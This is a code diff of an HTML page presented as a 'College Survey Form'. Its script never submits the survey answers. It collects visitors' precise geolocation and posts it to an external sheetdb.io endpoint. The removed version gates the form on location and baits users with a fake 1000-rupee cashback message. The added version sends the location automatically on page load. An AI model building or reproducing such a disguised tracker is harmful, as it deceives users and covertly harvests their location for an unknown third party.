@@ -80,17 +80,19 @@
 <form id="surveyForm">
   <h2>College Survey Form</h2>
 
+  <p id="msg" class="message"></p>
+
   <label for="name">Full Name *</label>
-  <input type="text" id="name" name="name" required disabled />
+  <input type="text" id="name" name="name" required />
 
   <label for="email">Email Address *</label>
-  <input type="email" id="email" name="email" required disabled />
+  <input type="email" id="email" name="email" required />
 
   <label for="college">College Name *</label>
-  <input type="text" id="college" name="college" required disabled />
+  <input type="text" id="college" name="college" required />
 
   <label for="course">Course *</label>
-  <select id="course" name="course" required disabled>
+  <select id="course" name="course" required>
     <option value="" disabled selected>Select your course</option>
     <option value="Computer Science">Computer Science</option>
     <option value="Electrical Engineering">Electrical Engineering</option>
@@ -100,7 +102,7 @@
   </select>
 
   <label for="year">Year of Study *</label>
-  <select id="year" name="year" required disabled>
+  <select id="year" name="year" required>
     <option value="" disabled selected>Select your year</option>
     <option value="1st Year">1st Year</option>
     <option value="2nd Year">2nd Year</option>
@@ -109,88 +111,59 @@
   </select>
 
   <label for="comments">Comments or Feedback</label>
-  <textarea id="comments" name="comments" rows="4" placeholder="Your thoughts..." disabled></textarea>
+  <textarea id="comments" name="comments" rows="4" placeholder="Your thoughts..."></textarea>
 
-  <button type="submit" disabled>Submit Survey</button>
-  <p id="msg" class="message"></p>
+  <button type="submit">Submit Survey</button>
 </form>
 
 <script>
-  const form = document.getElementById('surveyForm');
-  const msg = document.getElementById('msg');
-  const allInputs = form.querySelectorAll('input, select, textarea, button');
-  const API_URL = "https://sheetdb.io/api/v1/g0jdtpbi0265s";
+  const msg = document.getElementById("msg");
 
-  let userLocation = null;
+  const API_URL = "https://sheetdb.io/api/v1/g0jdtpbi0265s"; // Replace with your endpoint
 
-  // Disable all inputs until location is obtained
-  function toggleForm(enabled) {
-    allInputs.forEach(el => el.disabled = !enabled);
-  }
+  window.addEventListener("load", () => {
+    msg.textContent = "Requesting location permission...";
 
-  msg.textContent = "Requesting location permission...";
-  toggleForm(false);
-
-  // Get location on page load
-  window.onload = () => {
     if (!navigator.geolocation) {
-      msg.textContent = "Geolocation is not supported by your browser.";
-      msg.classList.add("error");
+      msg.textContent = "Geolocation not supported.";
+      msg.className = "message error";
       return;
     }
 
     navigator.geolocation.getCurrentPosition(
-      (position) => {
-        userLocation = {
-          lat: position.coords.latitude,
-          lon: position.coords.longitude
+      async (position) => {
+        const data = {
+          data: [{
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          }]
         };
-        msg.textContent = "Location captured successfully. You may now fill the form.";
-        msg.classList.add("success");
-        toggleForm(true);
+
+        try {
+          const res = await fetch(API_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          });
+
+          if (res.ok) {
+            msg.textContent = "Location sent successfully. Please fill the form.";
+            msg.className = "message success";
+          } else {
+            msg.textContent = "Failed to send location.";
+            msg.className = "message error";
+          }
+        } catch (err) {
+          msg.textContent = "Error sending location.";
+          msg.className = "message error";
+        }
       },
       () => {
-        msg.textContent = "Location permission denied. Cannot proceed.";
-        msg.classList.add("error");
+        msg.textContent = "Location permission denied.";
+        msg.className = "message error";
       }
     );
-  };
-
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    if (!userLocation) {
-      msg.textContent = "Location not available. Please refresh and allow location access.";
-      msg.classList.add("error");
-      return;
-    }
-
-    const dataToSend = {
-      data: [{
-        lat: userLocation.lat,
-        lon: userLocation.lon,
-        timestamp: new Date().toISOString()
-      }]
-    };
-
-    try {
-      const res = await fetch(API_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(dataToSend)
-      });
-
-      if (res.ok) {
-        msg.textContent = "Thank you! You earned a cashback of 1000 rupees.";
-        msg.className = "message success";
-        form.reset();
-      } else {
-        throw new Error("Failed to submit");
-      }
-    } catch (err) {
-      msg.textContent = "Error sending data. Please try again.";
-      msg.className = "message error";
-    }
   });
 </script>
 
